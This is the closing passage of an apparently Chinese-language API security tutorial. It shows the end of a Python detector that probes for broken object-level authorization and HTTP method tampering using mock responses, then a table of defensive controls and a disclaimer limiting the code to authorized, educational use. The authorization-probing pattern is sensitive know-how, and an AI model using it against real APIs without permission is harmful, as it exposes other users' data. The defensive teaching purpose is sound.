        endpoint_template="/api/v2/orders/{ID}",
        user_a_token=user_a_token,
        target_ids=target_order_ids,
        simulate_responses=MOCK_API_RESPONSES
    )
    if vulnerable:
        print(f"  [!] 发现 {len(vulnerable)} 个可越权访问的订单ID")

    # 场景2: HTTP方法篡改
    print(f"\n  场景2: HTTP方法篡改检测")
    detector.detect_method_tampering(
        endpoint="/api/v2/orders/5001",
        user_a_token=user_a_token,
        responses=MOCK_METHOD_RESPONSES
    )

    # 输出报告
    detector.print_report()
```

---

## 总结

| 安全维度 | 关键要点 | 核心防御 |
|----------|----------|----------|
| 认证 | JWT安全、OAuth2标准 | 强密钥、短过期、算法白名单 |
| 授权 | BOLA/BFLA防护 | 归属校验、RBAC/ABAC |
| 输入 | 注入防护 | 参数化查询、Schema验证 |
| 资源 | DoS防护 | 速率限制、分页限制 |
| 配置 | 最小暴露面 | 关闭调试、CORS白名单 |
| 资产 | 完整清单 | OpenAPI注册、版本废弃 |
| 第三方 | 响应验证 | 输出编码、域名白名单 |
| 监控 | 异常检测 | 行为基线、实时告警 |

> **安全声明**：本文档所有代码示例和Python脚本仅用于网络安全教育和防御检测目的。Python脚本使用模拟数据和模拟API端点，不对真实系统进行未授权测试。在实际环境中部署前，请咨询专业安全团队并遵循当地法律法规。所有漏洞检测脚本仅应用于自己拥有授权的系统。
